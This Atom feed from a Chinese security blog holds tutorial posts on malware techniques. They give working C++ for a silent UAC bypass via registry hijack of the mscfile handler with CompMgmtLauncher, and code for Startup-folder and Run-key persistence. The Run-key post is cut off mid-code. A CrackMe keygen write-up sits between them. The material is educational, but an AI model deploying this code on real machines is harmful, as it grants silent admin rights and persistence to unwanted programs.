<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>b1ackie&#39;blog</title>
  
  
  <link href="https://b1ack1e.github.io/atom.xml" rel="self"/>
  
  <link href="https://b1ack1e.github.io/"/>
  <updated>2021-07-20T08:03:10.346Z</updated>
  <id>https://b1ack1e.github.io/</id>
  
  <author>
    <name>b1ackie</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Bypass UAC</title>
    <link href="https://b1ack1e.github.io/2021/07/20/BypassUAC/"/>
    <id>https://b1ack1e.github.io/2021/07/20/BypassUAC/</id>
    <published>2021-07-20T06:24:40.000Z</published>
    <updated>2021-07-20T08:03:10.346Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h4><p>UAC（UserAccount Control，用户账户控制）是微软在VISTA之后的版本中引入的一种安全机制，通过UAC，应用程序和任务可以始终在非管理员账户的安全上下文中运行，除非特别授予管理员级别的系统访问权限。UAC可以阻止未经授权的应用程序自动进行安装，并防止无意地更改系统设置。</p><p>正常UAC是有一个弹窗提示，而病毒木马为了隐藏自己，就需要不通知用户的情况下“偷偷“将自己提升为管理员权限。</p><p><img src="/2021/07/20/BypassUAC/1.png"></p><p>在Windows中，一些高权限的程序在运行时，是不需要弹出UAC的。这些白名单程序，默认就是以管理员权限运行。可以通过DLL劫持、注入或者是修改注册表执行命令的方式启动目标程序，实现Bypass UAC提权操作。</p><p>下面拿白名单程序CompMgmtLauncher来进行一下分析。</p><h4 id="分析CompMgmtLauncher启动过程"><a href="#分析CompMgmtLauncher启动过程" class="headerlink" title="分析CompMgmtLauncher启动过程"></a>分析CompMgmtLauncher启动过程</h4><p>打开procmon工具来监控CompMgmtLauncher启动。可以看到，它会读取HKCU\Software\Classes\mscfile\shell\open\command中的值。</p><p><img src="/2021/07/20/BypassUAC/2.png"></p><p>可以看一下，此路径中存在什么，可以看到其中没有值</p><p><img src="/2021/07/20/BypassUAC/3.png"></p><p>如果该路径没有值，然后就会查询HKCR\mscfile\shell\open\command，查看其中的值，存储这mmc.exe进程的路径信息。</p><p><img src="/2021/07/20/BypassUAC/4.png"></p><p>现在可以知道，当它启动时，会先查看HKCU\Software\Classes\mscfile\shell\open\command，那么如果在这里添加路径信息，CompMgmtLauncher就会启动它。</p><p>现在就修改注册表信息，在HKCU\Software\Classes\mscfile\shell\open\command添加需要提权的程序路径，再运行CompMgmtLauncher就可以完成Bypass UAC提权。</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    PVOID OldValue = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//关闭重定位</span></span><br><span class="line">    <span class="built_in">Wow64DisableWow64FsRedirection</span>(&amp;OldValue);</span><br><span class="line">    HKEY hKey = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">RegCreateKeyEx</span>(HKEY_CURRENT_USER, <span class="string">&quot;Software\\Classes\\mscfile\\Shell\\Open\\Command&quot;</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, KEY_WOW64_64KEY | KEY_ALL_ACCESS, <span class="literal">NULL</span>, &amp;hKey, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hKey == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;创建键值失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">RegSetValueEx</span>(hKey, <span class="literal">NULL</span>, <span class="number">0</span>, REG_SZ, (BYTE*)<span class="string">&quot;C:\\Users\\b1ackie\\Desktop\\TestApc.exe&quot;</span>, (<span class="built_in">strlen</span>(<span class="string">&quot;C:\\Users\\b1ackie\\Desktop\\TestApc.exe&quot;</span>) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;CompMgmtLauncher.exe&quot;</span>);</span><br><span class="line">    <span class="built_in">Wow64RevertWow64FsRedirection</span>(OldValue);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要提权的程序为桌面上的TestApc.exe，运行后查看效果。运行程序可以看到，testapc.exe直接运行。</p><p><img src="/2021/07/20/BypassUAC/5.png"></p><p>使用procmon工具查看权限可以看到权限是高</p><p><img src="/2021/07/20/BypassUAC/6.png"></p><p>正常启动查看权限可以看到是中。</p><p><img src="/2021/07/20/BypassUAC/7.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Bypass-UAC&quot;&gt;&lt;a href=&quot;#Bypass-UAC&quot; class=&quot;headerlink&quot; title=&quot;Bypass UAC&quot;&gt;&lt;/a&gt;Bypass UAC&lt;/h4&gt;&lt;p&gt;UAC（UserAccount Control，用户账户控制）是微软在VIS</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="提权技术" scheme="https://b1ack1e.github.io/tags/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/"/>
    
    <category term="UAC" scheme="https://b1ack1e.github.io/tags/UAC/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe--002</title>
    <link href="https://b1ack1e.github.io/2021/07/20/160CrackMe-002/"/>
    <id>https://b1ack1e.github.io/2021/07/20/160CrackMe-002/</id>
    <published>2021-07-20T02:17:33.000Z</published>
    <updated>2021-07-20T02:28:03.719Z</updated>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序，看到提示输入name和serial，输入后，提示错误。</p><p><img src="/2021/07/20/160CrackMe-002/1.png"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>查壳，看到程序没有加壳，是用VB语言写的。</p><p><img src="/2021/07/20/160CrackMe-002/2.png"></p><p>使用OD进行分析，搜索错误提示的字符串，可以直接定位到关键的跳转</p><p><img src="/2021/07/20/160CrackMe-002/3.png"></p><p>开始分析生成serial的过程，首先是获取了name的长度然后将其乘以17CFB再加上name的第一个ASCII码，最后转为十进制字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00402412   .  50            push eax                                   ; /String = 0000000A ???</span><br><span class="line">00402413   .  8B1A          mov ebx,dword ptr ds:[edx]                 ; |</span><br><span class="line">00402415   .  FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBstr&gt;; \__vbaLenBstr</span><br><span class="line">0040241B   .  8BF8          mov edi,eax                                ;  获取输入的name长度传入edi以便运算</span><br><span class="line">0040241D   .  8B4D E8       mov ecx,dword ptr ss:[ebp-0x18]</span><br><span class="line">00402420   .  69FF FB7C0100 imul edi,edi,0x17CFB                       ;  长度乘0x17CFB</span><br><span class="line">00402426   .  51            push ecx                                   ; /String = 80020004 ???</span><br><span class="line">00402427   .  0F80 91020000 jo Afkayas_.004026BE                       ; |</span><br><span class="line">0040242D   .  FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;]       ; \rtcAnsiValueBstr</span><br><span class="line">00402433   .  0FBFD0        movsx edx,ax                               ;  获取输入的第一个ascii传给edx</span><br><span class="line">00402436   .  03FA          add edi,edx                                ;  乘法后的结果加上第一个ascii</span><br><span class="line">00402438   .  0F80 80020000 jo Afkayas_.004026BE</span><br><span class="line">0040243E   .  57            push edi                                   ;  MSVBVM50.__vbaStrCat</span><br><span class="line">0040243F   .  FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;] ;  计算结果转为字符串（十进制）</span><br><span class="line">00402445   .  8BD0          mov edx,eax</span><br><span class="line">00402447   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]</span><br></pre></td></tr></table></figure><p>然后将计算出的结果与“AKA-”进行拼接，再获取serial进行比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00402510   &gt; \8B45 E8       mov eax,dword ptr ss:[ebp-0x18]            ;  输入的Serial</span><br><span class="line">00402513   .  8B4D E4       mov ecx,dword ptr ss:[ebp-0x1C]            ;  计算后的结果</span><br><span class="line">00402516   .  8B3D 00414000 mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrC&gt;;  MSVBVM50.__vbaStrCat</span><br><span class="line">0040251C   .  50            push eax</span><br><span class="line">0040251D   .  68 701B4000   push Afkayas_.00401B70                     ;  AKA-</span><br><span class="line">00402522   .  51            push ecx                                   ; /String = 80020004 ???</span><br><span class="line">00402523   .  FFD7          call edi                                   ; \将AKA- 与计算后的数值拼接起来</span><br><span class="line">00402525   .  8B1D 70414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrM&gt;;  MSVBVM50.__vbaStrMove</span><br><span class="line">0040252B   .  8BD0          mov edx,eax</span><br><span class="line">0040252D   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]</span><br><span class="line">00402530   .  FFD3          call ebx                                   ;  MSVBVM50.__vbaStrMove; &lt;&amp;MSVBVM50.__vbaStrMove&gt;</span><br><span class="line">00402532   .  50            push eax</span><br><span class="line">00402533   .  FF15 28414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCmp&gt;&gt;;  比较</span><br></pre></td></tr></table></figure><h4 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h4><p>根据分析的结果进行注册机编写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输入name\n&quot;</span>);</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">gets_s(name, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">int</span> length = <span class="built_in">strlen</span>(name);</span><br><span class="line"><span class="keyword">int</span> num = length * <span class="number">0x17CFB</span>;</span><br><span class="line">num += name[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">char</span>* s1 = <span class="string">&quot;AKA-&quot;</span>;</span><br><span class="line"><span class="keyword">char</span>* serial = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(serial, <span class="string">&quot;%s%d&quot;</span>,s1,num);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;用户名是%s\n注册码是%s\n&quot;</span>,name, serial);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行输入name:b1ackie，输出serial:AKA-682815。</p><p><img src="/2021/07/20/160CrackMe-002/4.png"></p><p>输入正确的name和serial后，弹出正确提示</p><p><img src="/2021/07/20/160CrackMe-002/5.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;初探&quot;&gt;&lt;a href=&quot;#初探&quot; class=&quot;headerlink&quot; title=&quot;初探&quot;&gt;&lt;/a&gt;初探&lt;/h4&gt;&lt;p&gt;打开程序，看到提示输入name和serial，输入后，提示错误。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/07/20/160Crack</summary>
      
    
    
    
    <category term="CrackMe" scheme="https://b1ack1e.github.io/categories/CrackMe/"/>
    
    
    <category term="逆向工程" scheme="https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="CrackMe" scheme="https://b1ack1e.github.io/tags/CrackMe/"/>
    
  </entry>
  
  <entry>
    <title>自启动技术-快速启动目录</title>
    <link href="https://b1ack1e.github.io/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/"/>
    <id>https://b1ack1e.github.io/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/</id>
    <published>2021-07-19T09:11:43.000Z</published>
    <updated>2021-07-20T02:28:23.789Z</updated>
    
    <content type="html"><![CDATA[<h4 id="快速启动目录"><a href="#快速启动目录" class="headerlink" title="快速启动目录"></a>快速启动目录</h4><p>Windows带有快速启动目录，将需要自启的程序放入其中，就可以实现开机自启。</p><h4 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h4><h5 id="SHGetSpecialFolderPath"><a href="#SHGetSpecialFolderPath" class="headerlink" title="SHGetSpecialFolderPath"></a>SHGetSpecialFolderPath</h5><p>获取指定的系统路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOL SHGetSpecialFolderPath(</span><br><span class="line">  HWND  hwndOwner,</span><br><span class="line">  LPSTR lpszPath,</span><br><span class="line">  int   nFolder,</span><br><span class="line">  BOOL  fCreate</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hwndOwner：窗口所有者句柄</p><p>lpszPath：返回路径的缓冲区，该缓冲区带下至少为MAX_PATH</p><p>nFolder：系统路径的CSIDL标识。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>CSIDL_BITBUCKET</td><td>桌面\回收站</td></tr><tr><td>CSIDL_CONTROLS</td><td>我的电脑\控制面板</td></tr><tr><td>CSIDL_DESKTOP</td><td>桌面</td></tr><tr><td>CSIDL_DRIVES</td><td>我的电脑</td></tr><tr><td>CSIDL_STARTUP</td><td>开始菜单\程序\启动</td></tr><tr><td>CSIDL_SYSTEM</td><td>SYSTEM文件夹</td></tr><tr><td>CSIDL_WINDOWS</td><td>WINDOWS目录</td></tr></tbody></table><p>fCreate：指示文件夹不存在时是否要创建。为FALSE时则不创建，否则创建。</p><p>返回值：成功TRUE；失败FALSE。</p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>获取系统的快速启动目录，然后将需要自启的程序放入快速启动目录中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;shlobj.h&gt;</span></span></span><br><span class="line"><span class="function">BOOL <span class="title">AutoRun</span><span class="params">(<span class="keyword">char</span>* lpszSrcFilePath, <span class="keyword">char</span>* lpszDestFileName)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> szStartUpPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> szDestFilePath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//获取快速启动目录</span></span><br><span class="line"><span class="keyword">if</span> (SHGetSpecialFolderPathA(<span class="literal">NULL</span>, szStartUpPath, CSIDL_STARTUP, TRUE) == FALSE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;获取系统路径失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将数据写入指定的缓冲区</span></span><br><span class="line">wsprintfA(szDestFilePath, <span class="string">&quot;%s\\%s&quot;</span>, szStartUpPath, lpszDestFileName);</span><br><span class="line"><span class="comment">//将文件内容拷贝到缓冲区</span></span><br><span class="line"><span class="keyword">if</span> (CopyFileA(lpszSrcFilePath, szDestFilePath, FALSE) == FALSE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;向快速启动目录写入失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (AutoRun(<span class="string">&quot;C:\\Users\\b1ackie\\Desktop\\TestApc.exe&quot;</span>, <span class="string">&quot;TestApc.exe&quot;</span>) == FALSE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;失败\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;成功\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在物理机中运行一下此程序，火绒马上提醒</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/1.png"></p><p>在虚拟机中运行此程序，提示成功，然后到快速启动目录中查看，即可看到自启程序</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/2.png"></p><p>使用火绒剑进行查看，可以看到在windows的快速启动目录下，有TestApc.exe程序。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/3.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;快速启动目录&quot;&gt;&lt;a href=&quot;#快速启动目录&quot; class=&quot;headerlink&quot; title=&quot;快速启动目录&quot;&gt;&lt;/a&gt;快速启动目录&lt;/h4&gt;&lt;p&gt;Windows带有快速启动目录，将需要自启的程序放入其中，就可以实现开机自启。&lt;/p&gt;
&lt;h4 id=&quot;函数</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="自启动技术" scheme="https://b1ack1e.github.io/tags/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>自启动技术-注册表</title>
    <link href="https://b1ack1e.github.io/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/"/>
    <id>https://b1ack1e.github.io/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/</id>
    <published>2021-07-19T06:13:39.000Z</published>
    <updated>2021-07-19T09:11:29.721Z</updated>
    
    <content type="html"><![CDATA[<h4 id="注册表方式实现自启动"><a href="#注册表方式实现自启动" class="headerlink" title="注册表方式实现自启动"></a>注册表方式实现自启动</h4><p>实现开机自启动的方式有很多，其中修改注册表的方式是最为广泛的。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="RegOpenKeyEx"><a href="#RegOpenKeyEx" class="headerlink" title="RegOpenKeyEx"></a>RegOpenKeyEx</h5><p>打开一个指定的注册表键</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LSTATUS RegOpenKeyExA(</span><br><span class="line">  HKEY   hKey,</span><br><span class="line">  LPCSTR lpSubKey,</span><br><span class="line">  DWORD  ulOptions,</span><br><span class="line">  REGSAM samDesired,</span><br><span class="line">  PHKEY  phkResult</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hKey：打开注册表项的句柄。该句柄由RegCreateKeyEx或RegOpenKeyEx函数返回，或者它可以是以下预定义键之一：</p><ul><li>HKEY_CLASSES_ROOT</li><li>HKEY_CURRENT_CONFIG </li><li>HKEY_CURRENT_USER</li><li>HKEY_LOCAL_MACHINE</li><li>HKEY_USERS</li></ul><p>lpSubKey：将打开的注册表子项的名称</p><p>ulOptions：保留，必须设置为0</p><p>samDesired：对指定键希望得到的访问权限进行的访问标记。这个参数可以是下列值得组合</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>KEY_CREATE_LINK</td><td>准许生成符号键</td></tr><tr><td>KET_CREATE_SUB_KEY</td><td>准许生成子键</td></tr><tr><td>KEY_ENUMERATE_SUB_KEYS</td><td>准许生成枚举子键</td></tr><tr><td>KEY_EXECUTE</td><td>准许进行读操作</td></tr><tr><td>KEY_NOTIFY</td><td>准许更换通告</td></tr><tr><td>KEY_QUERY_VALUE</td><td>准许查询子键</td></tr><tr><td>KEY_ALL_ACESS</td><td>提供完全访问，它是上面数值的组合</td></tr><tr><td>KEY_READ</td><td>是KEY_QUERY_VALUE,KEY_ENUMERATE_SUB_KEYS,KEY_NOTIFY的组合</td></tr><tr><td>KEY_SET_VALUE</td><td>准许设置子键的数值</td></tr><tr><td>KEY_WRITE</td><td>是KEY_SET_VALUE、KET_CREATE_SUB_KEY的组合</td></tr><tr><td>KEY_WOW64_32KEY</td><td>表示64位系统中的应用程序应该在32位注册表试图上运行。32位系统会忽略该标志。</td></tr><tr><td>KEY_WOW64_32KEY</td><td>表示64位系统的应用程序应该在64位注册表试图上运行。32位系统上忽略该标志。</td></tr></tbody></table><p>phkResult：指向一个变量的指针，该变量保存打开注册表键的句柄。如果不再使用返回的句柄，则调用RegClose来关闭它。</p><p>返回值：如果成功，返回0；失败返回一个非零的错误代码。</p><h5 id="RegSetValueEx函数"><a href="#RegSetValueEx函数" class="headerlink" title="RegSetValueEx函数"></a>RegSetValueEx函数</h5><p>在注册表项下设置指定值得数据和类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LSTATUS RegSetValueExA(</span><br><span class="line">  HKEY       hKey,</span><br><span class="line">  LPCSTR     lpValueName,</span><br><span class="line">  DWORD      Reserved,</span><br><span class="line">  DWORD      dwType,</span><br><span class="line">  const BYTE *lpData,</span><br><span class="line">  DWORD      cbData</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hKey：指定一个已打开项的句柄，或一个标准项名。</p><p>lpValueName：指向一个字符串的指针，该字符串包含了与设置值的名称。若拥有该名称的值并不存在于指定的注册表中，则此函数会将其加入到该项。如果此值是NULL或指向空字符串，则此函数将会设置该项的默认值或未命名值得类型和数据。</p><p>Reserved：保留值，必须为0；</p><p>dwType：指定将存储的数据类型，该参数可以为以下值之一。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>REG_BINARY</td><td>任何形式的二进制数据</td></tr><tr><td>REG_DWORD</td><td>一个32位的数字</td></tr><tr><td>REG_DWORD_LITTLE_ENDIAN</td><td>一个格式为“低字节在前”的32位数字</td></tr><tr><td>REG_DWORD_BIG_ENDIAN</td><td>一个格式为“高字节在前”的32位数字</td></tr><tr><td>REG_EXPAND_SZ</td><td>一个以0结尾的字符串，该字符串包含环境变量（如“%PATH”）</td></tr><tr><td>REG_LINK</td><td>一个Unicode格式的带符号链接</td></tr><tr><td>REG_MULTI_SZ</td><td>一个以0结尾的字符串数组，该数组以链接两个0作为终止符</td></tr><tr><td>REG_ONE</td><td>未定义值类型</td></tr><tr><td>REG_RESOURCE_LIST</td><td>一个设备驱动器资源列表</td></tr><tr><td>REG_SZ</td><td>一个以0结尾的字符串</td></tr></tbody></table><p>lpData：指向一个缓冲区，该缓冲区包含了为指定值名称存储的数据。</p><p>cbData：指定由lpData参数所指向的数据大小，单位是字节。</p><p>返回值：返回0表示陈成功；返回其他任何值都代表一个错误代码。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>对于Windows来说，提供了专门的开机自启动注册表，每次开机时，它都会在这个注册表键下遍历键值，以获取键值中的程序路径，并创建进程启动程序。所以要想实现注册表开机自启动，只需要在这个注册表键下添加想要设置自启动的程序路径就可以了。</p><p>这里用最常见的RUN键来进行设置，该键位置是[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]和[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</p><p>代码实现在HKEY_LOCAL_MACHINE下进行设置，这需要管理员运行权限。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 